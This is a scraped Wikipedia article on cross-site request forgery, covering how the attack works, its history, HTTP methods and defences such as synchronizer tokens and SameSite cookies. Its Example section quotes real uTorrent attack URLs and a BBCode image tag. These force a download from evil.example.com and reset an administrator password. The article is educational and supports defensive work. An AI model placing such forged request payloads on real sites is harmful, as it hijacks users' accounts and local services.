@@ -1,0 +1,256 @@
+
+Title:
+Cross-site request forgery
+Text:
+
+		From Wikipedia, the free encyclopedia
+		
+		
+		
+		
+		Jump to navigation
+		Jump to search
+		Malicious website exploit where unauthorized commands are transmitted from a trusted user
+Cross-site request forgery, also known as one-click attack or session riding and abbreviated as CSRF (sometimes pronounced sea-surf[1]) or XSRF, is a type of malicious exploit of a website where unauthorized commands are submitted from a user that the web application trusts.[2] There are many ways in which a malicious website can transmit such commands; specially-crafted image tags, hidden forms, and JavaScript XMLHttpRequests, for example, can all work without the user's interaction or even knowledge. Unlike cross-site scripting (XSS), which exploits the trust a user has for a particular site, CSRF exploits the trust that a site has in a user's browser.
+In a CSRF attack, an innocent end user is tricked by an attacker into submitting a web request that they did not intend. This may cause actions to be performed on the website that can include inadvertent client or server data leakage, change of session state, or manipulation of an end user's account.
+The term "CSRF" is also used as an abbreviation in defences against CSRF attacks, such as techniques that use header data, form data, or cookies, to test for and prevent such attacks.
+
+Contents
+
+1 Characteristics
+2 History
+3 Example
+4 Forging login requests
+5 HTTP verbs and CSRF
+6 Other approaches to CSRF
+7 Effects
+8 Limitations
+9 Prevention
+
+9.1 Synchronizer token pattern
+9.2 Cookie-to-header token
+9.3 Double Submit Cookie
+9.4 SameSite cookie attribute
+9.5 Client-side safeguards
+9.6 Other techniques
+
+
+10 See also
+11 References
+12 External links
+
+
+
+Characteristics[edit]
+In a CSRF attack, the attacker's goal is to cause an innocent victim to unknowingly submit a maliciously crafted web request to a website that the victim has privileged access to. This web request can be crafted to include URL parameters, cookies and other data that appear normal to the web server processing the request. At risk are web applications that perform actions based on input from trusted and authenticated users without requiring the user to authorize the specific action. A user who is authenticated by a cookie saved in the user's web browser could unknowingly send an HTTP request to a site that trusts the user and thereby cause an unwanted action.
+A general property of web browsers is that they will automatically and invisibly include any cookies used by a given domain in any web request sent to that domain. This property is exploited by CSRF attacks in that any web request made by a browser will automatically include any cookies (including session cookies and others) created when a victim logs into a website. In the event that a user is tricked into inadvertently submitting a request through their browser these automatically included cookies will cause the forged request to appear real to the web server and it will perform any appropriately requested actions including returning data, manipulating session state, or making changes to the victim's account.
+In order for a CSRF attack to work, an attacker must identify a reproducible web request that executes a specific action such as changing an account password on the target page. Once such a request is identified, a link can be created that generates this malicious request and that link can be embedded on a page within the attacker's control.[1][3] This link may be placed in such a way that it is not even necessary for the victim to click the link. For example, it may be embedded within an html image tag on an email sent to the victim which will automatically be loaded when the victim opens their email. Once the victim has clicked the link, their browser will automatically include any cookies used by that website and submit the request to the web server. The web server will not be able to identify the forgery because the request was made by a user that was logged in, and submitted all the requisite cookies.
+Cross-site request forgery is an example of a confused deputy attack against a web browser because the web browser is tricked into submitting a forged request by a less privileged attacker.
+CSRF commonly has the following characteristics:
+
+It involves sites that rely on a user's identity.
+It exploits the site's trust in that identity.
+It tricks the user's browser into sending HTTP requests to a target site.
+It involves HTTP requests that have side effects.
+History[edit]
+CSRF vulnerabilities have been known and in some cases exploited since 2001.[4] Because it is carried out from the user's IP address, some website logs might not have evidence of CSRF.[2] Exploits are under-reported, at least publicly, and as of 2007[5] there were few well-documented examples: 
+
+The Netflix website in 2006 had numerous vulnerabilities to CSRF, which could have allowed an attacker to perform actions such as adding a DVD to the victim's rental queue, changing the shipping address on the account, or altering the victim's login credentials to fully compromise the account.[6]
+The online banking web application of ING Direct was vulnerable to a CSRF attack that allowed illicit money transfers.[7]
+Popular video website YouTube was also vulnerable to CSRF in 2008 and this allowed any attacker to perform nearly all actions of any user.[7]
+McAfee Secure was also vulnerable to CSRF and it allowed attackers to change their company system. This is fixed in newer versions.[8]
+New attacks against web-enabled devices were carried out in 2018,  including attempts to change the DNS settings of routers. Some router manufacturers hurriedly released firmware updates to improve protection, and advised users to change router settings to reduce the risk. Details were not released, citing "obvious security reasons".[9]
+
+Example[edit]
+  A National Vulnerability Database page describing a CSRF vulnerability
+Attackers who can find a reproducible link that executes a specific action on the target page while the victim is logged in can embed such link on a page they control and trick the victim into opening it.[1] The attack carrier link may be placed in a location that the victim is likely to visit while logged into the target site (for example, a discussion forum), or sent in an HTML email body or attachment. A real CSRF vulnerability in uTorrent (CVE-2008-6586) exploited the fact that its web console accessible at localhost:8080 allowed critical actions to be executed using a simple GET request:
+
+Force a .torrent file download
+http://localhost:8080/gui/?action=add-url&s=http://evil.example.com/backdoor.torrent
+Change uTorrent administrator password
+http://localhost:8080/gui/?action=setsetting&s=webui.password&v=eviladmin
+Attacks were launched by placing malicious, automatic-action HTML image elements on forums and email spam, so that browsers visiting these pages would open them automatically, without much user action. People running vulnerable uTorrent version at the same time as opening these pages were susceptible to the attack.
+CSRF attacks using image tags are often made from Internet forums, where users are allowed to post images but not JavaScript, for example using BBCode:
+
+[img]http://localhost:8080/gui/?action=add-url&s=http://evil.example.com/backdoor.torrent[/img]
+
+When accessing the attack link to the local uTorrent application at .mw-parser-output .monospaced{font-family:monospace,monospace}localhost:8080, the browser would also always automatically send any existing cookies for that domain. This general property of web browsers enables CSRF attacks to exploit their targeted vulnerabilities and execute hostile actions as long as the user is logged into the target website (in this example, the local uTorrent web interface) at the time of the attack.
+In the uTorrent example described above, the attack was facilitated by the fact that uTorrent's web interface used GET request for critical state-changing operations (change credentials, download a file etc.), which .mw-parser-output cite.citation{font-style:inherit;word-wrap:break-word}.mw-parser-output .citation q{quotes:"\"""\"""'""'"}.mw-parser-output .citation:target{background-color:rgba(0,127,255,0.133)}.mw-parser-output .id-lock-free a,.mw-parser-output .citation .cs1-lock-free a{background:linear-gradient(transparent,transparent),url("//upload.wikimedia.org/wikipedia/commons/6/65/Lock-green.svg")right 0.1em center/9px no-repeat}.mw-parser-output .id-lock-limited a,.mw-parser-output .id-lock-registration a,.mw-parser-output .citation .cs1-lock-limited a,.mw-parser-output .citation .cs1-lock-registration a{background:linear-gradient(transparent,transparent),url("//upload.wikimedia.org/wikipedia/commons/d/d6/Lock-gray-alt-2.svg")right 0.1em center/9px no-repeat}.mw-parser-output .id-lock-subscription a,.mw-parser-output .citation .cs1-lock-subscription a{background:linear-gradient(transparent,transparent),url("//upload.wikimedia.org/wikipedia/commons/a/aa/Lock-red-alt-2.svg")right 0.1em center/9px no-repeat}.mw-parser-output .cs1-ws-icon a{background:linear-gradient(transparent,transparent),url("//upload.wikimedia.org/wikipedia/commons/4/4c/Wikisource-logo.svg")right 0.1em center/12px no-repeat}.mw-parser-output .cs1-code{color:inherit;background:inherit;border:none;padding:inherit}.mw-parser-output .cs1-hidden-error{display:none;color:#d33}.mw-parser-output .cs1-visible-error{color:#d33}.mw-parser-output .cs1-maint{display:none;color:#3a3;margin-left:0.3em}.mw-parser-output .cs1-format{font-size:95%}.mw-parser-output .cs1-kern-left{padding-left:0.2em}.mw-parser-output .cs1-kern-right{padding-right:0.2em}.mw-parser-output .citation .mw-selflink{font-weight:inherit}RFCÂ 2616 explicitly discourages:
+
+.mw-parser-output .templatequote{overflow:hidden;margin:1em 0;padding:0 40px}.mw-parser-output .templatequote .templatequotecite{line-height:1.5em;text-align:left;padding-left:1.6em;margin-top:0}In particular, the convention has been established that the GET and HEAD methods SHOULD NOT have the significance of taking an action other than retrieval. These methods ought to be considered "safe". This allows user agents to represent other methods, such as POST, PUT and DELETE, in a special way, so that the user is made aware of the fact that a possibly unsafe action is being requested.
+Because of this assumption, many existing CSRF prevention mechanisms in web frameworks will not cover GET requests, but rather apply the protection only to HTTP methods that are intended to be state-changing.[10]
+
+Forging login requests[edit]
+An attacker may forge a request to log the victim into a target website using the attacker's credentials; this is known as login CSRF.  Login CSRF makes various novel attacks possible; for instance, an attacker can later log into the site with his legitimate credentials and view private information like activity history that has been saved in the account. This attack has been demonstrated against Google[11] and Yahoo.[12]
+
+HTTP verbs and CSRF[edit]
+Depending on the type, the HTTP request methods vary in their susceptibility to the CSRF attacks (due to the differences in their handling by the web browsers). Therefore, the protective measures against an attack depend on the method of the HTTP request.
+
+In HTTP GET the CSRF exploitation is trivial, using methods described above, such as a simple hyperlink containing manipulated parameters and automatically loaded by an IMG tag. By the HTTP specification however, GET should be used as a safe method, that is, not significantly changing user's state in the application. Applications using GET for such operations should switch to HTTP POST or use anti-CSRF protection.
+the HTTP POST vulnerability to CSRF depends on the usage scenario:
+In simplest form of POST with data encoded as a query string (field1=value1&field2=value2) CSRF attack is easily implemented using a simple HTML form and anti-CSRF measures must be applied.
+If data is sent in any other format (JSON, XML) a standard method is to issue a POST request using XMLHttpRequest with CSRF attacks prevented by Same-origin policy (SOP) and Cross-origin resource sharing (CORS); there is a technique to send arbitrary content from a simple HTML form using ENCTYPE attribute; such a fake request can be distinguished from legitimate ones by text/plain content type, but if this is not enforced on the server, CSRF can be executed[13][14]
+other HTTP methods (PUT, DELETE etc.) can only be issued using XMLHttpRequest with Same-origin policy (SOP) and Cross-origin resource sharing (CORS) and preventing CSRF; these measures however will not be active on websites that explicitly disable them using Access-Control-Allow-Origin: * header
+Other approaches to CSRF[edit]
+Additionally, while typically described as a static type of attack, CSRF can also be dynamically constructed as part of a payload for a cross-site scripting attack, as demonstrated by the Samy worm, or constructed on the fly from session information leaked via offsite content and sent to a target as a malicious URL.  CSRF tokens could also be sent to a client by an attacker due to session fixation or other vulnerabilities, or guessed via a brute-force attack, rendered on a malicious page that generates thousands of failed requests. The attack class of "Dynamic CSRF", or using a per-client payload for session-specific forgery, was described[15] in 2009 by Nathan Hamiel and Shawn Moyer at the BlackHat Briefings,[16] though the taxonomy has yet to gain wider adoption.
+A new vector for composing dynamic CSRF attacks was presented by Oren Ofer at a local OWASP chapter meeting in January 2012 â "AJAX Hammer â Dynamic CSRF".[17][18]
+
+Effects[edit]
+Severity metrics have been issued for CSRF vulnerabilities that result in remote code execution with root privileges[19] as well as a vulnerability that can compromise a root certificate, which will completely undermine a public key infrastructure.[20]
+
+Limitations[edit]
+This section does not cite any sources. Please help improve this section by adding citations to reliable sources. Unsourced material may be challenged and removed.  (May 2018) (Learn how and when to remove this template message)
+Several things have to happen for cross-site request forgery to succeed:
+
+The attacker must target either a site that doesn't check the referrer header or a victim with a browser or plugin that allows referer spoofing.[21]
+The attacker must find a form submission at the target site, or a URL that has side effects, that does something (e.g., transfers money, or changes the victim's e-mail address or password).
+The attacker must determine the right values for all the forms or URL inputs; if any of them are required to be secret authentication values or IDs that the attacker can't guess, the attack will most likely fail (unless the attacker is extremely lucky in their guess).
+The attacker must lure the victim to a web page with malicious code while the victim is logged into the target site.
+The attack is blind: the attacker cannot see what the target website sends back to the victim in response to the forged requests, unless they exploit a cross-site scripting or other bug at the target website.  Similarly, the attacker can only target any links or submit any forms that come up after the initial forged request if those subsequent links or forms are similarly predictable. (Multiple targets can be simulated by including multiple images on a page, or by using JavaScript to introduce a delay between clicks.)
+
+Prevention[edit]
+Most CSRF prevention techniques work by embedding additional authentication data into requests that allows the web application to detect requests from unauthorized locations.
+
+Synchronizer token pattern[edit]
+Synchronizer token pattern (STP) is a technique where a token, secret and unique value for each request, is embedded by the web application in all HTML forms and verified on the server side. The token may be generated by any method that ensures unpredictability and uniqueness (e.g. using a hash chain of random seed). The attacker is thus unable to place a correct token in their requests to authenticate them.[1][22][23]
+Example of STP set by Django in a HTML form:
+
+<input type="hidden" name="csrfmiddlewaretoken" value="KbyUmhTLMpYj7CD2di7JKP1P3qmLlkPt" />
+
+STP is the most compatible as it only relies on HTML, but introduces some complexity on the server side, due to the burden associated with checking validity of the token on each request. As the token is unique and unpredictable, it also enforces proper sequence of events (e.g. screen 1, then 2, then 3) which raises usability problem (e.g. user opens multiple tabs). It can be relaxed by using per session CSRF token instead of per request CSRF token.
+
+Cookie-to-header token[edit]
+Web applications that use JavaScript for the majority of their operations may use the following anti-CSRF technique:
+
+On an initial visit without an associated server session, the web application sets a cookie which is scoped appropriately so that it should not be provided during cross-origin requests. The cookie typically contains a random token which may remain the same for up to the life of the web session
+Set-Cookie: __Host-csrf_token=i8XNjC4b8KVok4uw5RftR38Wgp2BFwql; Expires=Thu, 23-Jul-2015 10:25:33 GMT; Max-Age=31449600; Path=/; SameSite=Lax; Secure
+
+JavaScript operating on the client side reads its value and copies it into a custom HTTP header sent with each transactional request
+X-Csrf-Token: i8XNjC4b8KVok4uw5RftR38Wgp2BFwql
+
+The server validates presence and integrity of the token
+Security of this technique is based on the assumption that only JavaScript running on the client side of an HTTPS connection to the server that initially set the cookie will be able to read the cookie's value. JavaScript running from a rogue file or email should not be able to successfully read the cookie value to copy into the custom header. Even though the csrf-token cookie will be automatically sent with the rogue request, the server will still expect a valid X-Csrf-Token header.
+The CSRF token itself should be unique and unpredictable. It may be generated randomly, or it may be derived from the session token using HMAC:
+
+csrf_token = HMAC(session_token, application_secret)
+
+The CSRF token cookie must not have httpOnly flag, as it is intended to be read by the JavaScript by design.
+This technique is implemented by many modern frameworks, such as Django[24] and AngularJS.[25] Because the token remains constant over the whole user session, it works well with AJAX applications, but does not enforce sequence of events in the web application.
+The protection provided by this technique can be thwarted if the target website disables its same-origin policy using one of the following techniques:
+
+clientaccesspolicy.xml file granting unintended access to Silverlight controls[26]
+crossdomain.xml file granting unintended access to Flash movies[27]
+Double Submit Cookie[edit]
+Similarly to the cookie-to-header approach, but without involving JavaScript, a site can set a CSRF token as a cookie, and also insert it as a hidden field in each HTML form. When the form is submitted, the site can check that the cookie token matches the form token. The same-origin policy prevents an attacker from reading or setting cookies on the target domain, so they cannot put a valid token in their crafted form.[28]
+The advantage of this technique over the Synchronizer pattern is that the token does not need to be stored on the server.
+
+SameSite cookie attribute[edit]
+An additional "SameSite" attribute can be included when the server sets a cookie, instructing the browser on whether to attach the cookie to cross-site requests. If this attribute is set to "strict", then the cookie will only be sent on same-site requests, making CSRF ineffective. However, this requires the browser to recognise and correctly implement the attribute, and also requires the cookie to have the "Secure" flag.[29]
+
+Client-side safeguards[edit]
+Browser extensions such as RequestPolicy (for Mozilla Firefox) or uMatrix (for both Firefox and Google Chrome/Chromium) can prevent CSRF by providing a default-deny policy for cross-site requests. However, this can significantly interfere with the normal operation of many websites. The CsFire extension (also for Firefox) can mitigate the impact of CSRF with less impact on normal browsing, by removing authentication information from cross-site requests.
+The NoScript extension for Firefox mitigates CSRF threats by distinguishing trusted from untrusted sites, and removing authentication & payloads from POST requests sent by untrusted sites to trusted ones. The Application Boundary Enforcer module in NoScript also blocks requests sent from internet pages to local sites (e.g. localhost), preventing CSRF attacks on local services (such as uTorrent) or routers.
+The Self Destructing Cookies extension for Firefox does not directly protect from CSRF, but can reduce the attack window, by deleting cookies as soon as they are no longer associated with an open tab.
+
+Other techniques[edit]
+Various other techniques have been used or proposed for CSRF prevention historically:
+
+Verifying that the request's headers contain X-Requested-With (used by Ruby on Rails before v2.0 and Django before v1.2.5), or checking the HTTP Referer header and/or HTTP Origin header.[30] However, this is insecure â a combination of browser plugins and redirects can allow an attacker to provide custom HTTP headers on a request to any website, hence allowing a forged request.[31][32]
+Checking the HTTP Referer header to see if the request is coming from an authorized page is commonly used for embedded network devices because it does not increase memory requirements. However, a request that omits the Referer header must be treated as unauthorized because an attacker can suppress the Referer header by issuing requests from FTP or HTTPS URLs.  This strict Referer validation may cause issues with browsers or proxies that omit the Referer header for privacy reasons.  Also, old versions of Flash (before 9.0.18) allow malicious Flash to generate GET or POST requests with arbitrary HTTP request headers using CRLF Injection.[33]  Similar CRLF injection vulnerabilities in a client can be used to spoof the referrer of an HTTP request.
+POST request method was for a while perceived as immune to trivial CSRF attacks using parameters in URL (using GET method). However, both POST and any other HTTP method can be now easily executed using XMLHttpRequest. Filtering out unexpected GET requests still prevents some particular attacks, such as cross-site attacks using malicious image URLs or link addresses and cross-site information leakage through <script> elements (JavaScript hijacking); it also prevents (non-security-related) problems with aggressive web crawlers and link prefetching.[1]
+Cross-site scripting (XSS) vulnerabilities (even in other applications running on the same domain) allow attackers to bypass essentially all CSRF preventions.[34]
+
+See also[edit]
+BREACH (security exploit)
+Confused deputy problem
+CRIME (security exploit)
+Cross-document messaging
+Heap spraying
+Replay attack
+Session fixation
+Web application security
+References[edit]
+.mw-parser-output .reflist{font-size:90%;margin-bottom:0.5em;list-style-type:decimal}.mw-parser-output .reflist .references{font-size:100%;margin-bottom:0;list-style-type:inherit}.mw-parser-output .reflist-columns-2{column-width:30em}.mw-parser-output .reflist-columns-3{column-width:25em}.mw-parser-output .reflist-columns{margin-top:0.3em}.mw-parser-output .reflist-columns ol{margin-top:0}.mw-parser-output .reflist-columns li{page-break-inside:avoid;break-inside:avoid-column}.mw-parser-output .reflist-upper-alpha{list-style-type:upper-alpha}.mw-parser-output .reflist-upper-roman{list-style-type:upper-roman}.mw-parser-output .reflist-lower-alpha{list-style-type:lower-alpha}.mw-parser-output .reflist-lower-greek{list-style-type:lower-greek}.mw-parser-output .reflist-lower-roman{list-style-type:lower-roman}
+
+^ a b c d e Shiflett, Chris (December 13, 2004). "Security Corner: Cross-Site Request Forgeries". php|architect (via shiflett.org). Retrieved 2008-07-03.
+
+^ a b Ristic, Ivan (2005). Apache Security. O'Reilly Media. p.Â 280. ISBNÂ 0-596-00724-8.
+
+^ "What is CSRF (Cross-site request forgery)? Tutorial & Examples". portswigger.net. Retrieved 2019-11-04.
+
+^ Burns, Jesse (2005). "Cross Site Request Forgery: An Introduction To A Common Web Weakness" (PDF). Information Security Partners, LLC. Retrieved 2011-12-12.
+
+^ Christey, Steve; Martin, Robert A. (May 22, 2007). "Vulnerability Type Distributions in CVE (version 1.1)". MITRE Corporation. Retrieved 2008-06-07.
+
+^ Washkuch Jr., Frank (October 17, 2006). "Netflix fixes cross-site request forgery hole". SC Magazine. Retrieved 2019-02-11.
+
+^ a b William Zeller; Edward W. Felten (October 2008). "Cross-Site Request Forgeries: Exploitation and Prevention" (PDF). Retrieved 29 May 2015.
+
+^ Mike, Bailey (2009). "CSRF: Yeah, It Still Worksâ¦" (PDF). DEFCON.
+
+^ "Security Advisory: CSRF & DNS/DHCP/Web Attacks". Draytek. May 2018. Retrieved 18 May 2018.
+
+^ 
+"Cross Site Request Forgery protection | Django documentation | Django". docs.djangoproject.com. Retrieved 2015-08-21.
+
+^ Adam Barth, Collin Jackson, and John C. Mitchell, Robust Defenses for Cross-Site Request Forgery, Proceedings of the 15th ACM Conference on Computer and Communications Security, ACM 2008
+
+^ Joseph Foulds, Passive monitoring login request forgery, Yahoo Archived 2014-12-22 at the Wayback Machine
+
+^ "Cross-Site Request Forgery For POST Requests With An XML Body". pentestmonkey. Retrieved September 4, 2015.
+
+^ Sheeraj Shah (2008). "Web 2.0 Hacking Defending Ajax & Web Services" (PDF). HITB. Retrieved September 4, 2015.
+
+^ "Security Fix - Weaponizing Web 2.0".
+
+^ Dynamic CSRF Archived 2010-02-13 at the Wayback Machine
+
+^ Owasp.org: Israel 2012/01: AJAX Hammer â Harnessing AJAX for CSRF Attacks
+
+^ Downloads â hasc-research â hasc-research â Google Project Hosting. Code.google.com (2013-06-17). Retrieved on 2014-04-12.
+
+^ "Vulnerability Note VU#584089 - cPanel XSRF vulnerabilities".
+
+^ "Vulnerability Note VU#264385 - OpenCA allows Cross site request forgery (XSRF)".
+
+^ "Enhanced cross-site attack prevention". Espacenet. European Patent Office. Retrieved 21 November 2019.
+
+^ "Cross-Site Request Forgery (CSRF) Prevention Cheat Sheet". OWASP. Retrieved 2019-07-19.
+
+^ "Valhalla Articles - Cross-Site Request Forgery: Demystified".
+
+^ "Cross Site Request Forgery protection". Django. Archived from the original on 2015-01-20. Retrieved 2015-01-20.
+
+^ "Cross Site Request Forgery (XSRF) Protection". AngularJS. Retrieved 2015-01-20.
+
+^ "Making a Service Available Across Domain Boundaries".
+
+^ Adamski, Lucas. "Cross-domain policy file usage recommendations for Flash Player - Adobe Developer Connection".
+
+^ "Double Submit Cookie defence". OWASP.
+
+^ "SameSite cookies". Mozilla.
+
+^ Origin Header Proposal Archived 2016-03-08 at the Wayback Machine. People.mozilla.org. Retrieved on 2013-07-29.
+
+^ "Django 1.2.5 release notes". Django.
+
+^ "Cross-Site Request Forgery (CSRF)". OWASP, The Open Web Application Security Project. 4 September 2012. Retrieved 11 September 2012.
+
+^ "Secunia Advisory SA22467". Secunia. 19 October 2006. Retrieved 11 September 2012.
+
+^ Schneider, Christian. "CSRF and same-origin XSS". Archived from the original on 2012-08-14. Retrieved 2012-04-21.
+
+
+External links[edit]
+A Most-Neglected Fact About Cross Site Request Forgery
+The Cross-Site Request Forgery FAQ
+Cross-Site Request Forgery from The Web Application Security Consortium Threat Classification Project
+
+
+
+
+<img src="//en.wikipedia.org/wiki/Special:CentralAutoLogin/start?type=1x1" alt="" title="" width="1" height="1" style="border: none; position: absolute;" />
+Retrieved from "https://en.wikipedia.org/w/index.php?title=Cross-site_request_forgery&oldid=1068591577"
+		Categories: Web security exploitsHidden categories: Webarchive template wayback linksArticles with short descriptionShort description is different from WikidataArticles needing additional references from May 2018All articles needing additional references
+	
